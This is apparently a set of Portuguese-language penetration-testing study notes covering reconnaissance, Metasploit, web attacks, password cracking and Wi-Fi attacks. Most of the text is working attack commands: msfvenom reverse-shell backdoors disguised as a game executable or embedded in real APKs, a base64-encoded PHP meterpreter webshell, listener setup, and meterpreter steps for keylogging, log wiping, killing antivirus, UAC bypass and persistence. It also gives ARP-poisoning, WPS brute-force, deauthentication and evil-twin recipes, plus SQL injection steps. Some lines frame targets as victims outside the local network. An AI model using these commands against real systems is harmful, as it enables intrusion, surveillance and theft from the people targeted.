RECONHECIMENTO

WhatsMyIP - site de auxilio em consulta de registros
archive.org - biblioteca da internet
sites de vaga de emprego
DNSlytics - super WhoIs
ReadNotify - Rastreador de emails
Grabify
Censys - ler documentação
Shodan
Sniper
Maltego
FOCA
-------------------------------------------------------------------------------
GOOGLE HACKING

intitle
inurl
intext
busca por termos inexatos ex: "escola de * em são paulo"
excluir termos da pesquisa ex: +"escola de * em são paulo"-yoga (exclui termos com yoga)
cache link (exibe a ultima versão do site salva no cache do google)
site .x.y (retorna sites com dominio .x.y)
filetype tipo de documento (exibe documentos com a extensão dada)

pode se mesclar pesquisas ex: site:gov.br filetype xls cpf (planilha de cpf)
---------------------------------------------------------------------------------
CONSULTA DE LEAKS (vazamentos)

Podemos consultar se há vazamento de senhas para um certo email pelo site
Have I Benn Pwned

podemos encontrar na internet bancos com dados sobre esses vazamentos, esses bancos geralmente são
compostos por arquivos .txt, podemos baixa los e procurar o vazamento requerido

grep -H (retorna o arquivo) nomedotextoprocurado nomedoarquivo.txt (*.txt procura em todos arquivos txt)
grep -a nomedotextoprocurado nomedoarquivo.txt (caso reconheça o arquivo como binário)
---------------------------------------------------------------------------------
VARREDURA

usando o nmap podemos executar
nmap -sn -n 10.0.0.0/24 | grep 10 | cut -d ' ' -f 5 > enderecos.txt
o nmap nesse caso ira apenas pingar e devolver os endereços conectados a rede, o grep filtra pelos
IPs apenas e o cut retira a quinta coluna após espaços, tudo é salvo no arsquivo passado
---------------------------------------------------------------------------------
ENUMERAÇÃO

captura de banners- é a tentativa de capturar os serviços q rodam em cada porta
podemos descobrir conectando na porta
ex: ftp host (tentativa de conectar ao ftp do host)

usando o netcat: nc host 80
GET /
HEAD
tentativas de visualizar o servidor da página web com o GET e HEAD
Podemos realizar o nmap para isso também
-----------------------------------------------------------------------------------
INVESTIGANDO VULNERABILIDADE

Podemos analisar se existe vulnerabilidade para o serviço encontrado
google: exploit, vulnerability
sites: exploit database, security focus
scanner de vulnerabilidades: OpenVAS
--------------------------------------------------------------------------------------
UTILIZANDO O METASPLOIT

iniciar o postgresql
podemos criar um arquivo XML com o nmap q contém a anáise desejada

ex nmap -A -oX resultados.xml ip

podemos importar o arquivo xml para o banco de dados do metasploit

ex db_import arquivo.xml

com isso podemos utilizar comandos como hosts e services para analisar parametros do ip analisado
como no nmap

o comando search -h nos mostra opções de pesquisa de exploits
o comando use nome_do_exploit nos permite usar o exploit desejado
o comando info nomedoexploit nos permite ver informações sobre a falha
dentro do exploit devemos primeiro configurar suas opções com show options e depois set nomedaopção

dentro de uma shell podemos usar ctrl+z para sair de uma seção e deixa la em plano de fundo
executando sessions -h podemos ver as opções para manipular sessões
usando session -u numera_da_sessao podemos rodar essa seção no meterpreter

podemos executar uma lista de comandos no metasploit com:
	msfconsole -x "comando1; comando2;...;"

podemos também criar um arquivo .rc com os comandos em cada linha e executar
	msfconsole -r script.rc
----------------------------------------------------------------------------
MÓDULOS IMPORTANTES DO METASPLOIT

windows/local - exploits windows
post/multi/recon/local_exploit_suggester - analisa vulnerabilidade e indica exploits
----------------------------------------------------------------------------
MSFVENOM - utilizado para explorar falhas do lado do cliente

* para atacar vitimas fora da rede local podemos usar o ip e portas fornecidos pelo ngrok que nos
redireciona para a rede local

msfvenom --help-formats (permite ver os formatos de backdoor q o msfvenom pode gerar)

REVERSE SHELL WINDOWS
msfvenom -p windows/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port(qualquer) -f exe > jogos.exe
// exemplo de criação de um backdoor com o payload que garante uma shell meterpreter no formato exe

GERANDO O AMBIENTE PARA RECEBER A SHELL
temos que criar um ambiente para receber a shell reversa, usamos o metasploit

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost lhost
set lport lport
exploit
// vai aguardar a conexão reversa

msfvenom -p windows/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port(qualquer) -x .exe -k -f exe > ex.exe
// linka um arquivo exe com o backdoor, alguns arquivos podem ser encontrados na pasta /usr/share/windows-binaries

REVERSE SHELL ANDROID
msfvenom -p android/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port(qualquer) R > ex.apk
// backdoor apk para android

para versões atuais do android é necessário assinar o apk:

keytool -genkey -v -keystore app.keystore -alias exemplo -keyalg RSA -keysize 2048 -validity 10000
// gera o arquivo de conjunto de chaves

apksigner sign --ks app.keystore -out teste_assinado.apk teste_n_assinado.apk
// gera o apk assinado com o apksigner gerando um arquivo novo (teste_assinado.apk)

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore app.keystore teste_n_assinado.apk exemplo
// gera o apk assinado com o jarsigner substituindo o arquivo teste_n_assinado.apk

***OBS abrir um servidor http python - python -m SimpleHTTPServer 8000

Gerar apk malicioso embutido com apk real
msfvenom -p android/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port(qualquer) -x 'ex.apk' -o ex.apk

usando o TheFatRat
https://null-byte.wonderhowto.com/forum/to-embed-msf-payload-original-apk-files-part-1-using-thefatrat-0188918/
-------------------------------------------------------------------------------------------------------------
GERANDO UM ARQUIVO PDF MALICIOSO
podemos procurar por exploits windows voltados para arquivos com - grep -i formato search exploit/windows/fileformat

o exploit/windows/fileformat/adobe_pdf_embedded_exe pode ser usado para criar um pdf malicioso que
funciona em várias plataformas adobe

configurando as opções usa se o handler e o payload padrão do meterpreter para linux 
------------------------------------------------------------------------------------------------------
FERRAMENTAS AUXILIARES DO METASPLOIT

autopwn - faz um brute force usando todos os exploits de browser

DOCUMENTAÇÃO DOS MÓDULOS AUXILIARES
https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
------------------------------------------------------------------------------------------
METERPRETER AVANÇADO

ps - lista processos rodando na máquina alvo
migrate numero - migra para o processo escolhido
run post/windows/manage/migrate - módulo procura e migra automaticamente o processo (desconfiável)
getuid - mostra qual o usuário vc é na máquina
getsystem - força uma escalação de privilégios (não funciona em sistemas mais atuais)
sysinfo - retorna informações do sistema
shell - dá acesso ao prompt de comando da máquina
clearev - limpa registros do windows
run killav - roda o script killav que tenta matar os antivirus
uictl opcão - permite desabilitar ou habilitar teclado/mouse
keyscan_start - inicia keylogger
keyscan_stop - para keylogger
keyscan_dump - pega resultado do keylogger
download arquivo - baixa arquivo da do alvo para o atacante
upload arquivo - faz upload de arquivo do atacante para o alvo
run vnc - roda o script que permite utilizar o vnc para obter acesso remoto a máquina alvo

ESCALAÇÃO DE PRIVILÉGIO EM SISTEMAS ATUAIS
Em sistemas atuais do windows existe o UAC (User Account Control) que controla as ações do usuário,
com isso o getsystem não funciona.

para burlar colocamos a sessão em background e iniciamos o exploit - exploit/windows/local/bypassuac

setando as opções rodamos o exploit e conseguimos uma nova sessão sem o uac, onde o getsystem funciona

PERSISTÊNCIA NO WINDOWS

com a máquina alvo já invadida, podemos usar o módulo windows/manage/persistence_exe
setando as opções é colocado no sistema alvo um arquivo que refaz a conexão mesmo após reinicialização
-------------------------------------------------------------------------------------------------
VULNERABILIDADES WEB

Mozilla Observatory - Obter informações importantes sobre o site
BurpSuite

SQL INJECTION COM BURP

existem 2 tipos de sql injection
sql injection error based - aproveita se de mensagens de erros
sql injection blind - não aparece mensagens de erro utilizáveis (cego)

ERROR BASED (UTILIZANDO DVWA DO METASPLOITABLE)

utiizando a variável do id descobrimos um erro setando ela como '
executamos: id=' order by 1,2,3,..., (descobrimos o número de tabelas = 3)
executamos: id=' union select null,null from tabela-- (-- + espaço sinaliza fim de comando)
mandamos esse request para o intruder no burp
setamos a informação que n conhecemos(tabela) como variável
setamos o payload utilizado, nesse caso uma wordlist de possiveis nomes de tabelas para força bruta
analisamos o resultado, os de maior tamanho geralmente resultam positivo
substituimos agora a tabelas que conhecemos e setamos os parametros null como payload
descobrimos os campos existentes e replicamos no request, descobrindo as informações

BLIND (UTILIZANDO DVWA DO METASPLOITABLE)
usando o burp podemos capturar informações do site e utilizar o sqlmap para realizar o ataque

ATAQUE CSRF(CROSS SITE REQUEST FORGERY)
ATAQUE XSS (CROSS SITE SCRIPTING OR REFLECTED CROSS SITE SCRIPTING)
-------------------------------------------------------------------------------------
WEBSHELLS

Commix - injetor de comando
python commix.py --url="url" --data="nome_par=INJECT_HERE&submit=nome_par" --cookie="__cfduid=dae240fb986dcadb7b1b74761e324c3911607829573; cf_clearance=d925014e33cafef772dc5f836b3fa13b58902232-1609608378-0-150"

msfvenom -p php/meterpreter/reverse_tcp lhost= lport= -e php/base64 -f raw > shell.php
(cria um trojan php criptografado em base64 ps: adicionar as tags do php ao arquivo)

Panoptic - analisa possiveis arquivos que podem ser comprometidos e estão acessiveis no site
--------------------------------------------------------------------------------------
SENHAS

Crunch - gerador de wordlists
Hydra - força bruta de senhas

Podemos usar a opção cluster bomb do intruder no Burp para realizar força bruta

JohnTheRipper - quebra hash de senha de forma offline
hashcat
----------------------------------------------------------------------------------------
ATAQUES EM REDE - habilitar roteamento global echo 1 > /proc/sys/net/ipv4/ip_forward(como user root)

o arp é o protocolo responsável por traduzir o endereço mac para endereço ip entre máquinas

arpspoof -i eth0 -t ip_alvo_inicial -r ip_fake_maquina2
envenenando o arp, podemos fingir ser uma máquina presente na rede local e mediar uma conexão entre outras 2 máquinas
utilizamos o wireshark para monitorar o tráfego

Ettercap
ettercap -G (interface gráfica)
ettercap -C (cursive)
ettercap -T terminal

ettercap é uma ferramenta que permite fazer man in the middle e possui várias ferramentas úteis, a opção é feita através da escolha de plugins

ettercap -T -i eth0 -M dhcp:192.168.0.150-160/255.255.255.0/8.8.8.8 (man in the middle com servidor dhcp fake simulado gerando ips na faixa dada e com dns do google)
ettercap -T -i eth0 -M arp:remote /192.168.0.1// /192.168.0.100-150// ou /// (envenenamento arp de um gateway, em uma faixa de ip ou todas máquinas da rede ///)
ettercap -T -i eth0 -M arp /// /// (envenenamento arp de gateway e máquinas gerais na rede)

mitmproxy utilizado para man in the middle remoto, necessário que o alvo utilize nossa máquina como servidor proxy, um arquivo de configuração de proxy pode ser 
passado via meterpreter no msfconsole para o alvo juntamente com o certificado do mitmproxy
--------------------------------------------------------------------------------------
ENGENHARIA SOCIAL APLICADA
driftnet - captura imagens em redes envenenadas
SET - Social Engineering Toolkit
------------------------------------------------------------------------------------
Wireless
iniciar placa no modo monitor com airmon-ng

airmon-ng check kill 
mata processos que impedem inicialização

airmon-ng start wlan0
cria nova interface de rede no modo monitor

BURLAR FILTRO DE MAC
RECUSA DE SERVIÇO
ver script testewifi.sh
----------------------------------------------------
XSS (cross site scripting) em paginas de configuração de rede
podemos buscar falhas na página de configurações do roteador

QUEBRANDO CHAVES (WPA)

airodump-ng --bssid MAC -w arquivo wlan0mon // inicia modo monitor no mac alvo salvando em arquivo

necessário esperar os clientes reconectarem na rede para captura do handshake, para isso é feita a desconexão de usuários com aireplay-ng
lembrar de travar o modo monitor no canal em que o alvo está transmitindo. Notar captura do handshake e executar o deauth multiplas vezes para garantia

QUEBRANDO CHAVE

utilizando o aircrack e uma wordlist podemos tentar quebrar a chave de acesso, podemos usar o crunch como auxiliar

WPS
ataque de força bruta no pin wps
detectando redes que utilizam wps com wash

wash -i wlan0mon

utilizando o reaver para quebra 

reaver -i wlan0mon -b mac -K(ataque com pixie offline) 1 -vv

reaver -i wlan0mon -b mac -d 302 -vv (pausa de 302 segundos nas requests para evitar block)

caso haja travamento podemos usar o mdk3 para combinar varios ataques de força bruta e travar o roteador, resetando o status do wps
--------------------------------------------
ATAQUE EVIL TWIN

airbase-ng cria access point fake

airbase-ng -c canal -e acess_point_name wlan0mon

executar script fake_access_point para inicializar ou evil_twin.sh para criar ap fake identico a rede local 

ifconfig at0 192.168.2.1 up // sobe interface
service isc-dhcp-server start // inicia dhcp
dnsspoof -i at0 // desvia acesso para interface web com apache2

criamos um ap fake com airbase-ng com o mesmo nome do ap alvo, executamos um deauth no ponto de acesso fazendo com que o acesso
seja redirecionado ao evil twin

EVIL TWIN COM BRIDGE NETWORK

podemos criar uma ponte entre a interface at0 que recebe o ap e nossa interface principal(eth0), conseguindo monitorar acessos como
se estivessem na rede local, usando wireshark etc.

retirar ip das interfaces, ifconfig eth0 0.0.0.0 up e ifconfig at0 0.0.0.0 up
brctl addbr ponte (add ponte)
brctl addif ponte at0 (add interface)
brctl addif ponte eth0
ifconfig ponte ip 255.255.255.0 (add ip)

quando houver conexão no ponto de acesso fake que escuta em at0, a conexão será retransmitida para eth0 e poderá haver monitoramento de tráfego

FLUXION - programa que automatiza todo o processo de captura do handshake e implementação do evil twin
